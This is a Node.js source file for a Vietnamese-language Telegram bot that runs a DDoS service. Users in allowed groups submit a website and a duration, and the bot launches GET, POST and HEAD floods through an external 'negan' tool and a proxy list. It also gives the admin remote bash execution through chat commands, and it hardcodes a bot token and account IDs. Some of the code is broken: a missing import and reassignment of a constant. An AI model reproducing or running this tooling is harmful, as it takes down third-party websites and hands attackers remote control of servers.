const TelegramBot = require('node-telegram-bot-api');
const { spawn } = require('child_process');

const token = '7935173392:AAFlDNftPJAUzhvRV1xAxyj4FXj6XSl7A8Q';
const adminId = 7371969470;
const allowedGroupIds = new Set([-1002411881962, -1002334544605, -1002365124072, -1002345371324, 998877665]);
const bot = new TelegramBot(token, { polling: true });
const maxSlot = 1;
const maxCurrent = 3;
const maxTimeAttacks = 120;

let currentProcesses = 0;
let queue = [];
let userProcesses = {};
let activeAttacks = {};
let botStartTime = Date.now();

const restartBot = () => {
    console.error('🚨 Restarting bot...');
    bot.stopPolling();
    setTimeout(() => {
        bot = new TelegramBot(token, { polling: true });
        initBot();
    }, 1000);
};

const initBot = () => {
    bot.sendMessage(adminId, '[🤖Version PRO🤖] BOT Đang Chờ Lệnh.');
    const helpMessage = `📜 Hướng dẫn sử dụng:\n➔ Lệnh chính xác: <code>https://example.com 120</code>\n➔ Lệnh full: <code>https://example.com 120 full</code>\n⚠️ Lưu ý: Thời gian tối đa là ${maxTimeAttacks} giây.`;

    bot.on('message', async msg => handleMessage(msg));
    bot.on('polling_error', restartBot);
    process.on('uncaughtException', restartBot);
    process.on('unhandledRejection', restartBot);
};

const handleMessage = async (msg) => {
    const { chat: { id: chatId }, text, from: { id: userId, username, first_name }, date } = msg;
    const isAdmin = chatId === adminId;
    const isGroup = allowedGroupIds.has(chatId);
    const caller = username || first_name;

    if (date * 1000 < botStartTime) return;

    if (!isAdmin && !isGroup) return bot.sendMessage(chatId, '❌ Bạn không có quyền sử dụng liên hệ: https://t.me/NeganSSHConsole.', { parse_mode: 'HTML' });
    if (!text || !['http://', 'https://', 'exe ', '/help'].some(cmd => text.startsWith(cmd))) return;
    if (text === '/help') return bot.sendMessage(chatId, helpMessage, { parse_mode: 'HTML' });

    if (text.startsWith('http')) {
        const [host, time, full] = text.split(' ');
        if (!host || isNaN(time)) return bot.sendMessage(chatId, '🚫 Sai định dạng! Nhập theo: <code>https://example.com 120</code> hoặc <code>https://example.com 120 full</code>.', { parse_mode: 'HTML' });
        const attackTime = Math.min(parseInt(time, 10), maxTimeAttacks);
        const isFullAttack = full === 'full';

        if (userProcesses[userId] >= maxSlot) return bot.sendMessage(chatId, `❌ Bạn đã đạt giới hạn số lượng tiến trình (${maxSlot}).`);
        if (currentProcesses >= maxCurrent) {
            queue.push({ userId, host, time: attackTime, chatId, caller, isFullAttack });
            return bot.sendMessage(chatId, '⏳ Yêu cầu được đưa vào hàng đợi...', { parse_mode: 'HTML' });
        }

        const pid = Math.floor(Math.random() * 10000);
        const endTime = Date.now() + attackTime * 1000;
        activeAttacks[pid] = { userId, endTime, commands: isFullAttack ? 3 : 1, completedCommands: 0 };
        userProcesses[userId] = (userProcesses[userId] || 0) + 1;
        currentProcesses++;

        const methods = isFullAttack ? ['GET', 'POST', 'HEAD'] : ['GET'];
        const startMessage = JSON.stringify({
            Status: "✨🚀🛸 Successfully 🛸🚀✨",
            Caller: caller,
            "PID Attack": pid,
            Website: host,
            Time: `${attackTime} Giây`,
            Maxslot: maxSlot,
            Maxtime: maxTimeAttacks,
            ConcurrentAttacks: currentProcesses,
            Methods: methods,
            StartTime: new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' }),
            CheckHostURL: `Check Host (https://check-host.net/check-http?host=${host})`,
            HostTracker: `Host Tracker (https://www.host-tracker.com/en/ic/check-http?url=${host})`
        }, null, 2).replace(/"Methods": \[\s*"([^"]+)"\s*\]/g, '"Methods": ["$1"]');

        await bot.sendMessage(chatId, startMessage, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: 'Check Host', url: `https://check-host.net/check-http?host=${host}` }, { text: 'Host Tracker', url: `https://www.host-tracker.com/en/ic/check-http?url=${host}` }]] } });

        const nodeOptions = '--max-old-space-size=8192';
        if (isFullAttack) {
            runCommand(['./negan', '-m', 'GET', '-u', host, '-p', 'live.txt', '--full', 'true', '-s', attackTime.toString()], pid, userId, chatId, caller, host, attackTime, nodeOptions);
            runCommand(['./negan', '-m', 'POST', '-u', host, '-p', 'live.txt', '--full', 'true', '-s', attackTime.toString()], pid, userId, chatId, caller, host, attackTime, nodeOptions);
            runCommand(['./negan', '-m', 'HEAD', '-u', host, '-p', 'live.txt', '--full', 'true', '-s', attackTime.toString()], pid, userId, chatId, caller, host, attackTime, nodeOptions);
        } else {
            runCommand(['./negan', '-m', 'GET', '-u', host, '-p', 'live.txt', '--full', 'true', '-s', attackTime.toString()], pid, userId, chatId, caller, host, attackTime, nodeOptions);
        }
        return;
    }

    if (text.startsWith('exe ') && isAdmin) {
        const cmd = text.slice(4);
        if (!cmd) return bot.sendMessage(chatId, '🚫 Lệnh không được trống! VD: <code>exe ls</code>', { parse_mode: 'HTML' });
        exec(cmd, { shell: '/bin/bash' }, (e, o, er) => bot.sendMessage(chatId, `🚀 Kết quả lệnh:\n<pre>${cmd}\n${o || er}</pre>`, { parse_mode: 'HTML' }));
    }
};

const runCommand = (args, pid, userId, chatId, caller, host, attackTime, nodeOptions) => {
    console.log(`🚀 Đang chạy lệnh: node ${nodeOptions} ${args.join(' ')}`);
    const child = spawn('node', [nodeOptions, ...args], { shell: true });

    child.stdout.on('data', (data) => console.log(`stdout: ${data}`));
    child.stderr.on('data', (data) => console.error(`stderr: ${data}`));
    child.on('close', (code) => handleCommandCompletion(null, null, null, pid, userId, chatId, caller, host, attackTime));
    child.on('error', (err) => handleCommandCompletion(err, null, null, pid, userId, chatId, caller, host, attackTime));

    setTimeout(() => !child.killed && child.kill(), attackTime * 1000);
};

const handleCommandCompletion = (e, stdout, stderr, pid, userId, chatId, caller, host, attackTime) => {
    const attack = activeAttacks[pid];
    if (!attack) return;

    attack.completedCommands++;
    if (attack.completedCommands === attack.commands) {
        const completeMessage = JSON.stringify({ Status: "👽 END ATTACK 👽", Caller: caller, "PID Attack": pid, Website: host, Time: `${attackTime} Giây`, EndTime: new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' }) }, null, 2);
        bot.sendMessage(chatId, completeMessage, { parse_mode: 'HTML' });
        delete activeAttacks[pid];
        userProcesses[userId]--;
        currentProcesses--;

        if (queue.length) {
            const next = queue.shift();
            bot.sendMessage(next.chatId, `📥 Khởi động từ hàng đợi: ${next.host} ${next.time}s`);
            bot.emit('message', { chat: { id: next.chatId }, from: { id: next.userId, username: next.caller }, text: `${next.host} ${next.time}` });
        }
    }
};

initBot();
